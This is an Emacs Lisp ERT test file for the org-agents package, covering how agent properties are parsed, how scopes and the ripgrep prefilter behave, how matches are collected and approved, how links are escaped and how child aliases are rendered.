  "Run BODY in the agent buffer of `org-agents-test--with-corpus', at its start."
  (declare (indent 0))
  `(org-agents-test--with-corpus
     (with-current-buffer (find-file-noselect agent-file)
       (goto-char (point-min))
       ,@body)))

(ert-deftest org-agents-test-read-agent ()
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
      (should (equal (plist-get agent :query)
                     '(and (todo) (property "NEXT_REVIEW"))))
      (should (eq (plist-get agent :view) 'children))
      (should (markerp (plist-get agent :marker))))))

(ert-deftest org-agents-test-read-agent-rejects-unusable-properties ()
  "Everything an agent entry supplies is text from a file."
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_QUERY" "(and (todo")
    (should-error (org-agents--read-agent) :type 'user-error)
    (org-entry-put nil "AGENT_QUERY" "(todo)")
    (org-entry-put nil "AGENT_LIMIT" "soon")
    (should-error (org-agents--read-agent) :type 'user-error)
    (org-entry-put nil "AGENT_LIMIT" "3")
    (should (= 3 (plist-get (org-agents--read-agent) :limit))))
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect b)
      (goto-char (point-min))
      (should-error (org-agents--read-agent) :type 'user-error))))

(ert-deftest org-agents-test-read-agent-refuses-an-unknown-view ()
  "A view naming no renderer is refused, not rendered as a list.
Every view but `table' renders as a list, so `tabel' interned unremarked
would render a list and read exactly like a table view that happened to
come out flat."
  (org-agents-test--in-agent
    (dolist (view '("children" "list" "table"))
      (org-entry-put nil "AGENT_VIEW" view)
      (should (eq (intern view) (plist-get (org-agents--read-agent) :view))))
    ;; A view is matched as written, so a different case is a different
    ;; view -- `table' is the only spelling the table renderer answers to.
    (dolist (bad '("tabel" "Table" "columnview" "children list"))
      (org-entry-put nil "AGENT_VIEW" bad)
      (let ((err (should-error (org-agents--read-agent) :type 'user-error)))
        (should (string-match-p "AGENT_VIEW" (error-message-string err)))))
    ;; A view no renderer answers to leaves no symbol behind either.
    (org-entry-put nil "AGENT_VIEW" "org-agents-test--never-a-view")
    (should-error (org-agents--read-agent) :type 'user-error)
    (should-not (intern-soft "org-agents-test--never-a-view"))
    ;; `:AGENT_VIEW: nil' never reaches this package: Org reads the text
    ;; `nil' in a property value as no value at all unless asked for it
    ;; literally, so such an agent takes the `children' default.
    (org-entry-put nil "AGENT_VIEW" "nil")
    (should (null (org-entry-get nil "AGENT_VIEW")))
    (should (eq 'children (plist-get (org-agents--read-agent) :view)))))

(ert-deftest org-agents-test-read-agent-scope-spellings ()
  "The three corpus names are symbols; any other bare value is a directory.
Interning it too would leave the `path' conjunct and the directory
branch of `org-agents--scope-base-files' unreachable."
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_SCOPE" "active")
    (should (eq 'active (plist-get (org-agents--read-agent) :scope)))
    (org-entry-put nil "AGENT_SCOPE" "positron")
    (should (equal "positron" (plist-get (org-agents--read-agent) :scope)))
    (org-entry-put nil "AGENT_SCOPE" "(\"x.org\")")
    (should (equal '("x.org") (plist-get (org-agents--read-agent) :scope)))
    (org-entry-delete nil "AGENT_SCOPE")
    (should (eq 'agenda (plist-get (org-agents--read-agent) :scope)))))

(ert-deftest org-agents-test-read-agent-blank-properties-read-as-absent ()
  "A property line with nothing after it does not supply a value.
Read as one, an empty scope resolves to the whole of `org-directory'
without the prefilter a corpus that size requires, and an empty sort
reaches `read-from-string' as an end of file."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* Review agent\n:PROPERTIES:\n:AGENT_QUERY: (todo)\n"
              ":AGENT_SCOPE:\n:AGENT_SORT:\n:AGENT_LIMIT:\n:AGENT_VIEW:\n"
              ":AGENT_COLUMNS:\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (org-agents--read-agent)))
        (should (eq 'agenda (plist-get agent :scope)))
        (should (eq 'children (plist-get agent :view)))
        (should (null (plist-get agent :sort)))
        (should (null (plist-get agent :limit)))
        (should (null (plist-get agent :columns)))))))

(ert-deftest org-agents-test-read-agent-marker-anchors-on-the-headline ()
  "The marker names the agent's own headline, not wherever point sat.
`org-agents--collect' compares it against each match's
`:org-hd-marker', which org-ql sets to the headline's `:begin'."
  (org-agents-test--in-agent
    (goto-char (point-max))
    (should (= 1 (marker-position (plist-get (org-agents--read-agent) :marker))))))

(ert-deftest org-agents-test-read-agent-rejects-unreadable-scope-and-sort ()
  "A malformed value must not escape as `end-of-file'.
`org-agents-update-all' answers for one agent at a time by catching
`user-error', and would abort the whole run over anything else."
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_SCOPE" "(\"a.org\"")
    (should-error (org-agents--read-agent) :type 'user-error)
    (org-entry-delete nil "AGENT_SCOPE")
    (org-entry-put nil "AGENT_SORT" "(date")
    (should-error (org-agents--read-agent) :type 'user-error)))

(ert-deftest org-agents-test-scope-base-files-rejects-bad-scope ()
  (should-error (org-agents--scope-base-files '(path "x")) :type 'user-error)
  (should-error (org-agents--scope-base-files 42) :type 'user-error))

(ert-deftest org-agents-test-scope-base-files-refuses-a-missing-directory ()
  "A directory that is not there is one agent's mistyped scope.
`directory-files-recursively' signals `file-missing', which is what this
package raises for a bug of its own: `org-agents-update' would let it
through to the debugger rather than report it against the agent whose
property it came from."
  (org-agents-test--with-corpus
    (let ((err (should-error (org-agents--scope-base-files "no-such-subdir")
                            :type 'user-error)))
      (should (string-match-p "no-such-subdir" (error-message-string err))))
    ;; A directory that is there still answers with the files below it.
    (make-directory (expand-file-name "sub" dir))
    (with-temp-file (expand-file-name "sub/s.org" dir) (insert "* TODO S\n"))
    (should (equal (list (expand-file-name "sub/s.org" dir))
                   (org-agents--scope-base-files "sub")))))

(ert-deftest org-agents-test-scope-base-files-branches ()
  "What each scope names, over a corpus with an archive in it."
  (org-agents-test--with-corpus
    (make-directory (expand-file-name "sub/archive" dir) t)
    (make-directory (expand-file-name "archive" dir) t)
    (let ((archived (expand-file-name "archive/old.org" dir))
          (nested (expand-file-name "sub/archive/older.org" dir))
          (kept (expand-file-name "sub/kept.org" dir)))
      (dolist (file (list archived nested kept))
        (write-region "* TODO Something\n" nil file nil 'quiet))
      (let ((active (org-agents--scope-base-files 'active))
            (all (org-agents--scope-base-files 'all)))
        ;; `active' descends the corpus, but into no `archive' directory,
        ;; however deep it sits.
        (should (member a active))
        (should (member kept active))
        (should-not (member archived active))
        (should-not (member nested active))
        ;; `all' spares nothing.
        (should (member archived all))
        (should (member nested all)))
      ;; A directory scope walks that subtree, relative to `org-directory'.
      (let ((sub (org-agents--scope-base-files "sub")))
        (should (member kept sub))
        (should (member nested sub))
        (should-not (member a sub)))
      ;; `agenda' defers to `org-agenda-files' whatever the corpus holds.
      (let ((org-agenda-files (list a)))
        (should (equal (list a) (org-agents--scope-base-files 'agenda)))))))

(ert-deftest org-agents-test-needs-prefilter-p ()
  "Which scopes are worth narrowing before they are read.
`agenda' and an explicit file list name their files and are read live;
the corpus names and any directory promise nothing about how much they
hold."
  (dolist (scope '(active all "sub" "sub/" "a/b" "/Users/johnw/org/sub"
                   "~/org/sub"))
    (should (org-agents--needs-prefilter-p scope)))
  (dolist (scope '(agenda ("a.org") ("a.org" "b.org") nil))
    (should-not (org-agents--needs-prefilter-p scope))))

(ert-deftest org-agents-test-scope-root ()
  "Only an unbounded scope has a root, and a corpus scope is `org-directory'."
  (org-agents-test--with-corpus
    (should (equal (org-agents--scope-root 'active) (expand-file-name dir)))
    (should (equal (org-agents--scope-root 'all) (expand-file-name dir)))
    (should (null (org-agents--scope-root 'agenda)))
    (should (null (org-agents--scope-root (list a b))))
    (make-directory (expand-file-name "sub" dir))
    (should (equal (org-agents--scope-root "sub")
                   (expand-file-name "sub" dir)))
    ;; An ABSOLUTE directory is a root like any other.  The refusal that
    ;; used to sit here was a database artefact: the conjunct handed to
    ;; the CLI had to be a path prefix relative to the corpus root, so an
    ;; absolute directory could not be expressed and pushed nothing.
    ;; ripgrep is handed a directory, and any directory will do.
    (let ((absolute (expand-file-name "sub" dir)))
      (should (equal (org-agents--scope-root absolute) absolute)))
    ;; A directory that is not there is a mistyped scope, named as one.
    (let ((err (should-error (org-agents--scope-root "no-such-subdir")
                             :type 'user-error)))
      (should (string-match-p "no-such-subdir" (error-message-string err))))))

(ert-deftest org-agents-test-scope-files-intersects-by-truename ()
  "`org-directory' is commonly a symlink, and ripgrep answers from its root.
Compared with `equal' the two spellings of one file have nothing in
common, and the agent would silently match nothing at all."
  (org-agents-test--with-corpus
    (let ((link (expand-file-name "link-a.org" dir)))
      (make-symbolic-link "a.org" link)
      (with-current-buffer (find-file-noselect agent-file)
        (goto-char (point-min))
        (let ((agent (plist-put (org-agents--read-agent) :scope 'active)))
          (cl-letf (((symbol-function 'org-agents--rg-available-p)
                     (lambda () t))
                    ((symbol-function 'org-agents--rg-files-for)
                     (lambda (_patterns _root) (list a)))
                    ((symbol-function 'org-agents--scope-base-files)
                     (lambda (_scope) (list link b))))
            ;; The base spelling is what is returned: it is the name the
            ;; user reads and the link that will be followed.
            (should (equal (list link) (org-agents--scope-files agent)))))))))

(ert-deftest org-agents-test-scope-names-an-unreadable-file ()
  "A file a scope names but nothing can open is reported BY NAME, once.
Handed one, `org-ql-select' calls `display-warning', which RETURNS the
warning text as a string, leaves that string in its list of buffers, and
calls `buffer-name' on it -- so the diagnostic arrives as the payload of
`Wrong type argument: bufferp, \"Error (org-ql-select): Can\\='t open
file: ...\"', and every agent in the buffer fails with a type error that
reads like a bug in this package.  REPRODUCED for a missing file and for
a `chmod 000' one, over `agenda', an explicit list, and `all'.

The two halves of the decision, which are deliberately different:

  - An explicit `:AGENT_SCOPE:' file list is a HARD `user-error'.  The
    user named this file in this agent; dropping it would render a
    smaller answer with nothing to say it was smaller.
  - `agenda', a directory, `active' and `all' SKIP, with one message
    naming the files.  These describe a set rather than enumerating it,
    and one stale path in a list Org maintains -- or one root-owned stray
    in the corpus -- must not break every agent in the buffer.  Never
    silent: the message is the difference between a skip and a drop.

`org-agenda-skip-unavailable-files' at `t' has already filtered the list,
so that configuration must be untouched -- the fourth arm asserts the
package says nothing at all there."
  (org-agents-test--with-corpus
    (let ((missing (expand-file-name "nope.org" dir))
          (query '(and (todo) (property "NEXT_REVIEW"))))
      (with-current-buffer (find-file-noselect agent-file)
        (goto-char (point-min))
        (let ((base (org-agents--read-agent)))
          ;; 1. `agenda' at the Emacs default: skipped, named once, and the
          ;; match from the readable file still arrives.
          (let* ((agent (plist-put (copy-sequence base) :scope 'agenda))
                 (org-agenda-files (list a missing))
                 (org-agenda-skip-unavailable-files nil)
                 matches
                 (msgs (org-agents-test--messages
                         (setq matches (org-agents--collect agent)))))
            (should (= 1 (length matches)))
            (should (= 1 (length (cl-remove-if-not
                                  (lambda (m) (string-match-p (regexp-quote missing) m))
                                  msgs))))
            (should (cl-find-if (lambda (m) (string-match-p "agenda" m)) msgs)))
          ;; 2. An explicit list naming the same file: refused, by name.
          (let* ((agent (plist-put (copy-sequence base) :scope (list a missing)))
                 (err (should-error (org-agents--collect agent) :type 'user-error)))
            (should (string-match-p (regexp-quote missing)
                                    (error-message-string err))))
          ;; 3. `org-agenda-skip-unavailable-files' t: Org filtered the list
          ;; already, so this package has nothing to say and says nothing.
          (let* ((agent (plist-put (copy-sequence base) :scope 'agenda))
                 (org-agenda-files (list a missing))
                 (org-agenda-skip-unavailable-files t)
                 matches
                 (msgs (org-agents-test--messages
                         (setq matches (org-agents--collect agent)))))
            (should (= 1 (length matches)))
            (should-not (cl-find-if (lambda (m) (string-match-p "cannot be read" m))
                                    msgs)))
          ;; 4. A file visited while readable and then made unreadable still
          ;; renders its match, in an EXPLICIT list where a false alarm
          ;; would be a `user-error'.  MEASURED: `file-readable-p' is nil,
          ;; `find-buffer-visiting' is non-nil, and `org-ql-select' over it
          ;; works -- so the predicate is `(or (find-buffer-visiting f)
          ;; (file-readable-p f))', mirroring org-ql's own rule, and a bare
          ;; `file-readable-p' would newly refuse what works today.
          (let ((visited (expand-file-name "visited.org" dir)))
            (with-temp-file visited
              (insert "* TODO Visited\n:PROPERTIES:\n"
                      ":NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n"))
            (find-file-noselect visited)
            (set-file-modes visited #o000)
            (unwind-protect
                (let ((agent (plist-put (copy-sequence base)
                                        :scope (list visited))))
                  (should-not (file-readable-p visited))
                  (should (find-buffer-visiting visited))
                  (should (= 1 (length (org-agents--collect agent)))))
              (set-file-modes visited #o644))))))))

(ert-deftest org-agents-test-collect-applies-exclusion-and-todo ()
  (org-agents-test--in-agent
    (let* ((agent (org-agents--read-agent))
           (matches (org-agents--collect agent)))
      (should (= 1 (length matches)))
      (should (equal (org-element-property :raw-value (car matches))
                     "Fix widget")))))

(ert-deftest org-agents-test-collect-skips-generated-aliases ()
  "An agent must not consume another agent's output -- unless asked to."
  (org-agents-test--with-corpus
    (with-temp-buffer
      (insert "* TODO Generated alias\n:PROPERTIES:\n:AGENT_MATCH: t\n"
              ":NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n")
      (append-to-file (point-min) (point-max) a))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (org-agents--read-agent)))
        (should (= 1 (length (org-agents--collect agent))))
        ;; nil turns the exclusion off; conjoined into the query it would
        ;; instead be a clause that never matches.
        (let ((org-agents-exclude nil))
          (should (= 2 (length (org-agents--collect agent)))))))))

(ert-deftest org-agents-test-collect-gates-the-form-it-runs ()
  "A collect refuses a form its exclusion made unsafe, at the call site.
The agent's own query is structurally safe here, so nothing but the
exclusion can stop the collect -- and if the gate is handed the query
rather than the form, nothing does."
  (org-agents-test--in-agent
    (let ((org-agents--session-approved (make-hash-table :test 'equal))
          (org-agents-safe-queries nil)
          (noninteractive t)
          (org-agents-exclude '(org-agents-test--tripwire))
          (org-agents-test--tripwire-count 0)
          (agent (org-agents--read-agent)))
      (should (org-agents--structurally-safe-p (plist-get agent :query)))
      (let ((err (should-error (org-agents--collect agent) :type 'user-error)))
        (should (string-match-p "not approved" (error-message-string err))))
      ;; org-ql never saw the form, so nothing in it ran at any entry.
      (should (= 0 org-agents-test--tripwire-count)))))

(ert-deftest org-agents-test-collect-skips-the-agent-itself ()
  "An agent that matches its own query does not render itself."
  (org-agents-test--in-agent
    (goto-char (point-max))
    (let ((agent (org-agents--read-agent)))
      (setq agent (plist-put agent :scope (list agent-file)))
      (setq agent (plist-put agent :query '(property "AGENT_QUERY")))
      (should (null (org-agents--collect agent))))))

(ert-deftest org-agents-test-collect-corpus-scope-refuses-under-require ()
  "Under `require' an unnarrowable corpus scope is refused, not walked.
And it says so before walking the corpus it is refusing to read."
  (org-agents-test--in-agent
    (let ((agent (plist-put (org-agents--read-agent) :scope 'active))
          (org-agents-prefilter 'require)
          (org-agents-rg-executable "no-such-program-xyzzy"))
      (cl-letf (((symbol-function 'org-agents--scope-base-files)
                 (lambda (_scope) (error "must not walk the corpus"))))
        (should-error (org-agents--collect agent) :type 'user-error)))))

(ert-deftest org-agents-test-collect-directory-scope-refuses-under-require ()
  "A directory is as unbounded as `all' is.
Nothing about naming a directory bounds it below corpus size, and the
recursive walk it would otherwise take is what the prefilter is for."
  (org-agents-test--in-agent
    (make-directory (expand-file-name "sub" dir))
    (let ((agent (plist-put (org-agents--read-agent) :scope "sub"))
          (org-agents-prefilter 'require)
          (org-agents-rg-executable "no-such-program-xyzzy"))
      (cl-letf (((symbol-function 'org-agents--scope-base-files)
                 (lambda (_scope) (error "must not walk the corpus"))))
        (should-error (org-agents--collect agent) :type 'user-error)))))

(ert-deftest org-agents-test-collect-requires-a-marker ()
  "Without a marker the self-skip cannot run, and the agent would render
itself as one of its own matches.  Say so instead."
  (org-agents-test--in-agent
    (let ((agent (plist-put (org-agents--read-agent) :marker nil)))
      (should-error (org-agents--collect agent) :type 'user-error))))

(ert-deftest org-agents-test-collect-requires-a-live-marker ()
  "A detached marker is no better than none, and must be said to be.
`org-agents--self-match-p' compares the agent's buffer against each
match's; against a detached marker's nil buffer it answers nil for every
match, so the agent renders itself as one of its own matches -- and where
the match's marker is detached too, `=' is reached with a nil position
and signals `wrong-type-argument', naming neither the agent nor the
property that was wrong."
  (org-agents-test--in-agent
    (let ((agent (plist-put (org-agents--read-agent) :query
                            '(property "AGENT_QUERY"))))
      (setq agent (plist-put agent :scope (list agent-file)))
      ;; Live: the agent is skipped, and its own query matches nothing else.
      (should (null (org-agents--collect agent)))
      ;; Detached: refused outright rather than answered with the agent.
      (let ((detached (plist-put (copy-sequence agent) :marker (make-marker))))
        (let ((err (should-error (org-agents--collect detached)
                                 :type 'user-error)))
          (should (string-match-p "live marker" (error-message-string err))))))))

(ert-deftest org-agents-test-collect-corpus-scope-refuses-an-unpushable-query ()
  "A query with nothing to push cannot be narrowed, and `require' says so."
  (org-agents-test--in-agent
    (let ((agent (plist-put (org-agents--read-agent) :scope 'all))
          (org-agents-prefilter 'require))
      (setq agent (plist-put agent :query '(todo)))
      (cl-letf (((symbol-function 'org-agents--rg-run)
                 (lambda (&rest _) (error "must not run without a conjunct"))))
        (should-error (org-agents--collect agent) :type 'user-error)))))

(ert-deftest org-agents-test-collect-prefilter-intersects ()
  "A corpus scope narrows to the candidate files, and only those are read."
  (org-agents-test--with-corpus
    (let ((link (expand-file-name "link-a.org" dir))
          (asked nil))
      (make-symbolic-link "a.org" link)
      (with-current-buffer (find-file-noselect agent-file)
        (goto-char (point-min))
        (let ((agent (plist-put (org-agents--read-agent) :scope 'active)))
          (cl-letf (((symbol-function 'org-agents--rg-available-p)
                     (lambda () t))
                    ((symbol-function 'org-agents--rg-files-for)
                     (lambda (patterns _root) (setq asked patterns) (list a)))
                    ((symbol-function 'org-agents--scope-base-files)
                     (lambda (_scope) (list link b))))
            (let ((matches (org-agents--collect agent)))
              ;; The seam is the PATTERNS, which is what reaches
              ;; ripgrep: the query's one pushable conjunct, compiled.
              (should (equal asked
                             (org-agents--rg-patterns
                              '(property "NEXT_REVIEW"))))
              (should (equal asked '("^[ \\t]*:NEXT_REVIEW\\+?:")))
              (should (= 1 (length matches)))
              (should (equal "Fix widget"
                             (org-element-property :raw-value (car matches)))))))))))

(ert-deftest org-agents-test-collect-empty-prefilter-selects-nothing ()
  "A prefilter that rules out every file selects nothing.
Handed no files at all, `org-ql-select' searches the current buffer,
which for an agent is the file the agent itself lives in.

TWO ways of arriving at no files, and they are different branches of
`org-agents--scope-files'.  The first stub answers a NON-EMPTY candidate
list naming a file the scope does not hold, so the intersection empties
it -- that is the `same-files' branch.  The second answers the EMPTY
list, which is ripgrep saying \"no file can match\", and reaches the
`((null candidates) nil)' branch instead.  Nothing used to test the
second: replacing that branch with the scope's whole base file set left
the suite green, which is precisely the conflation of \"an empty answer\"
with \"nothing was narrowed\" that this backend exists to remove."
  (org-agents-test--with-corpus
    (with-temp-buffer
      (insert "* TODO Decoy beside the agent\n")
      (append-to-file (point-min) (point-max) agent-file))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (plist-put (org-agents--read-agent)
                              :query '(heading "Decoy"))))
        (setq agent (plist-put agent :scope 'active))
        (cl-letf (((symbol-function 'org-agents--rg-available-p)
                   (lambda () t))
                  ((symbol-function 'org-agents--rg-files-for)
                   (lambda (_patterns _root)
                     (list (expand-file-name "elsewhere.org" dir)))))
          (should (null (org-agents--scope-files agent)))
          (should (null (org-agents--collect agent))))
        ;; An EMPTY ripgrep answer.  `nil' rather than the base list is
        ;; what distinguishes the branch, and the base list here is not
        ;; empty -- the corpus holds `a.org' and `b.org' -- so the
        ;; assertion cannot hold for want of anything to lose.
        (cl-letf (((symbol-function 'org-agents--rg-available-p)
                   (lambda () t))
                  ((symbol-function 'org-agents--rg-files-for)
                   (lambda (_patterns _root) nil)))
          (should (org-agents--scope-base-files 'active))
          (should (null (org-agents--scope-files agent)))
          (should (null (org-agents--collect agent))))
        ;; And the base files must not even be GATHERED for an empty
        ;; answer: gathering them is the recursive walk the prefilter
        ;; exists to make unnecessary.
        (cl-letf (((symbol-function 'org-agents--rg-available-p)
                   (lambda () t))
                  ((symbol-function 'org-agents--rg-files-for)
                   (lambda (_patterns _root) nil))
                  ((symbol-function 'org-agents--scope-base-files)
                   (lambda (&rest _) (error "must not walk the corpus"))))
          (should (null (org-agents--scope-files agent))))))))

(ert-deftest org-agents-test-collect-refuses-unapproved-query ()
  (org-agents-test--in-agent
    (let ((org-agents--session-approved (make-hash-table :test 'equal))
          (org-agents-safe-queries nil)
          (noninteractive t)
          (agent (org-agents--read-agent)))
      (setq agent (plist-put agent :query '(and (todo) (shell-command "x"))))
      (should-error (org-agents--collect agent) :type 'user-error))))

(ert-deftest org-agents-test-collect-honors-limit ()
  (org-agents-test--in-agent
    ;; Both entries of a.org carry NEXT_REVIEW; only one of them is a TODO.
    (let ((agent (plist-put (org-agents--read-agent)
                            :query '(property "NEXT_REVIEW"))))
      (should (= 2 (length (org-agents--collect agent))))
      (should (= 1 (length (org-agents--collect (plist-put agent :limit 1)))))
      (should (= 2 (length (org-agents--collect (plist-put agent :limit 9)))))
      (should (null (org-agents--collect (plist-put agent :limit 0))))
      ;; Sorted, then cut: `reverse' brings the second entry of a.org to
      ;; the front, so a limit of 1 keeps that one and not the first.
      (should (equal '("Fix widget" "Old thing")
                     (org-agents-test--titles
                      (org-agents--collect (plist-put agent :limit 9)))))
      (setq agent (plist-put agent :sort 'reverse))
      (should (equal '("Old thing")
                     (org-agents-test--titles
                      (org-agents--collect (plist-put agent :limit 1))))))))

(ert-deftest org-agents-test-element-sort ()
  "org-ql sorts elements; a table view sorts rendered rows of strings.
This is the accessor that decides which of the two a sort is, so it
answers nil for a row sort and for a non-sort alike.  Telling those two
apart is `org-agents--sort-ok-p', and refusing the second is
`org-agents--read-sort'."
  (should (eq 'date (org-agents--element-sort 'date)))
  ;; `reverse' means nothing on its own, so a list of methods passes too.
  (should (equal '(date reverse) (org-agents--element-sort '(date reverse))))
  (should (null (org-agents--element-sort nil)))
  (should (null (org-agents--element-sort '(ts-column 2))))
  (should (null (org-agents--element-sort '(column 2))))
  (should (null (org-agents--element-sort 'bogus))))

(ert-deftest org-agents-test-read-sort-refuses-what-cannot-order ()
  "A sort that is not a sort is diagnosed, not quietly ignored.
It was the last agent property left to fail silently: neither
`org-agents--element-sort' nor `org-agents--check-row-sort' answers for a
misspelling, so `:AGENT_SORT: dtae' updated cleanly, rendered unsorted and
wrote `:AGENT_MATCHED:' -- indistinguishable from a sort whose matches
happened to be in that order already."
  ;; Everything some view can order by passes through unchanged.
  (dolist (sort '(nil date todo priority (date reverse) (priority todo)
                  (column 2) (ts-column 1)))
    (should (equal sort (org-agents--read-sort sort))))
  (dolist (sort '(dtae bogus "date" (dtae) (date bogus) 7
                  ;; A row sort has to name its column with a number, which
                  ;; is wrong whatever the table turns out to hold.  WHICH
                  ;; number is `org-agents--sort-column''s to answer.
                  (column) (column "2") (ts-column) (column 1 2)))
    (let ((err (should-error (org-agents--read-sort sort) :type 'user-error)))
      (should (string-match-p "cannot sort by" (error-message-string err)))))
  ;; Read from the property, which is where it actually arrives.
  (org-agents-test--in-agent
    (org-entry-put nil "AGENT_SORT" "dtae")
    (let ((err (should-error (org-agents--read-agent) :type 'user-error)))
      (should (string-match-p "cannot sort by" (error-message-string err))))
    (org-entry-put nil "AGENT_SORT" "date")
    (should (eq 'date (plist-get (org-agents--read-agent) :sort)))))

(ert-deftest org-agents-test-collect-passes-only-element-sorters ()
  "A sort org-ql does not know would raise an error out of `org-ql-select'.
So a row sort, which org-ql has no reading of, is withheld from it and
ordered by the table renderer instead.  A sort that is no sort at all no
longer reaches here: `org-agents--read-sort' refuses it where the property
is read -- see `org-agents-test-read-sort-refuses-what-cannot-order'."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
      (should (= 1 (length (org-agents--collect (plist-put agent :sort 'date)))))
      (should (= 1 (length (org-agents--collect
                            (plist-put agent :sort '(date reverse))))))
      (should (= 1 (length (org-agents--collect
                            (plist-put agent :sort '(ts-column 2)))))))))

;;;; Links

(ert-deftest org-agents-test-link-id-and-fallback ()
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let* ((agent (org-agents--read-agent))
             (matches (org-agents--collect agent))
             (link (org-agents--link-to (car matches))))
        (should (string-match-p "\\`\\[\\[id:11111111-" link))
        (should (string-match-p "\\[Fix widget\\]\\]\\'" link)))))
  ;; Fallback: entry without ID gets a file link with a heading search.
  (let ((dir (make-temp-file "org-agents-noid" t))
        (org-element-use-cache nil))
    (unwind-protect
        (let ((f (expand-file-name "x.org" dir)))
          (with-temp-file f (insert "* TODO A [tricky] title\n"))
          (let* ((matches (org-ql-select (list f) '(todo)
                            :action 'element-with-markers))
                 (link (org-agents--link-to (car matches))))
            (should (string-match-p "\\`\\[\\[file:" link))
            (should (string-match-p "::\\*" link))))
      ;; `org-ql-select' left a buffer visiting a file about to be
      ;; deleted, which would otherwise survive into every later test and
      ;; into the developer's own session.
      (dolist (buf (buffer-list))
        (when-let* ((bf (buffer-file-name buf)))
          (when (string-prefix-p (file-name-as-directory dir) bf)
            (with-current-buffer buf (set-buffer-modified-p nil))
            (kill-buffer buf))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-link-escapes-brackets ()
  "A rendered link must read back as one link, and as the same target.
`org-agents--render-children' recognizes an alias by the target read
back out of its heading, so a description that swallowed the closing
brackets would leave the alias unrecognizable -- and Org would not
follow it either.  `org-link-escape' escapes every bracket in the
target, so only an unescaped reading compares equal to the target a
fresh render builds.  The search target carries exactly one asterisk,
which `org-link-heading-search-string' supplies itself."
  (let ((dir (make-temp-file "org-agents-brackets" t))
        (org-element-use-cache nil))
    (unwind-protect
        (let ((f (expand-file-name "brackets.org" dir)))
          (with-temp-file f
            (insert "* TODO A [tricky] title\n"
                    "* TODO [[https://example.com][site]]\n"
                    "* TODO Ends in a bracket [x]\n"))
          (let ((elements (org-ql-select (list f) '(todo)
                            :action 'element-with-markers)))
            (should (= 3 (length elements)))
            (dolist (element elements)
              (let ((link (org-agents--link-to element))
                    (title (org-element-property :raw-value element)))
                ;; One bracket link, start to end: no part of the
                ;; description leaked out of it.
                (should (string-match org-link-bracket-re link))
                (should (= 0 (match-beginning 0)))
                (should (= (length link) (match-end 0)))
                (should (equal (org-agents--alias-target link)
                               (concat "file:" f "::"
                                       (org-link-heading-search-string title))))))
            ;; The inner link's own description survives the escaping.
            (should (string-match-p "site" (org-agents--link-to
                                            (nth 1 elements))))))
      (dolist (buf (buffer-list))
        (when-let* ((f (buffer-file-name buf)))
          (when (string-prefix-p (file-name-as-directory dir) f)
            (with-current-buffer buf (set-buffer-modified-p nil))
            (kill-buffer buf))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-link-in-indirect-buffer ()
  "A match reached through an indirect buffer still links to its file.
`buffer-file-name' answers nil for an indirect buffer, and with neither
an ID nor a file there is nothing to link to, so the match would render
as plain text instead.  The file is the base buffer's, which is how
`org-id' reads it too."
  (let ((dir (make-temp-file "org-agents-indirect" t))
        (org-element-use-cache nil)
        (org-id-locations (make-hash-table :test #'equal))
        (org-id-files nil))
    (unwind-protect
        (let* ((f (expand-file-name "x.org" dir))
               (base (progn (with-temp-file f (insert "* TODO No id here\n"))
                            (find-file-noselect f)))
               (indirect (make-indirect-buffer base "org-agents-indirect-x" t)))
          (unwind-protect
              (let ((element
                     (org-element-create
                      'headline
                      (list :raw-value "No id here"
                            :org-hd-marker
                            (with-current-buffer indirect
                              (goto-char (point-min))
                              (point-marker))))))
                (should (equal (org-agents--alias-target
                                (org-agents--link-to element))
                               (concat "file:" f "::"
                                       (org-link-heading-search-string
                                        "No id here")))))
            (kill-buffer indirect)))
      (dolist (buf (buffer-list))
        (when-let* ((bf (buffer-file-name buf)))
          (when (string-prefix-p (file-name-as-directory dir) bf)
            (with-current-buffer buf (set-buffer-modified-p nil))
            (kill-buffer buf))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-link-unresolved-match ()
  "A match whose marker names no buffer is rendered as plain text.
Killing the buffer detaches the marker org-ql handed us, and there is
no heading left to build a link at.  A link that does not resolve is
worse than text saying there is none."
  (let ((ghost (org-element-create
                'headline (list :raw-value "Vanished entry"
                                :org-hd-marker (make-marker)))))
    (should (equal "Vanished entry (?)" (org-agents--link-to ghost)))
    ;; Nor is there an entry left to read `:AGENT_FORMAT:' properties at.
    (should (null (org-agents--format-suffix ghost "NEXT_REVIEW"))))
  ;; An element that never carried a marker reads the same way.
  (should (equal "Vanished entry (?)"
                 (org-agents--link-to
                  (org-element-create 'headline
                                      (list :raw-value "Vanished entry"))))))

;;;; Children view

(ert-deftest org-agents-test-children-render-and-preserve ()
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (let ((agent (org-agents--read-agent)))
        ;; First render.
        (should (= 1 (org-agents--render-children
                      agent (org-agents--collect agent))))
        (should (string-match-p ":AGENT_MATCH: t" (buffer-string)))
        ;; Annotate the alias, then re-render: annotation survives,
        ;; no duplicate child appears.
        (goto-char (point-max))
        (insert "*** my note about this match\n")
        (goto-char (point-min))
        (org-agents--render-children agent (org-agents--collect agent))
        (should (string-match-p "my note about this match" (buffer-string)))
        (should (= 1 (cl-count-if
                      (lambda (l) (string-match-p "Fix widget" l))
                      (split-string (buffer-string) "\n"))))))))

(ert-deftest org-agents-test-children-regenerates-a-retitled-pristine-alias ()
  "Retitling an alias does not pin it; only writing under one does.
`org-agents--child-pristine-p' reads what is under the heading rather
than the heading itself, and an alias holding nothing but its own drawer
is this package's to rewrite.  So an edited title comes back as the
render builds it -- and exactly once, not the edited heading and a fresh
alias beside it."
  (org-agents-test--in-agent
    (let ((agent (org-agents--read-agent)))
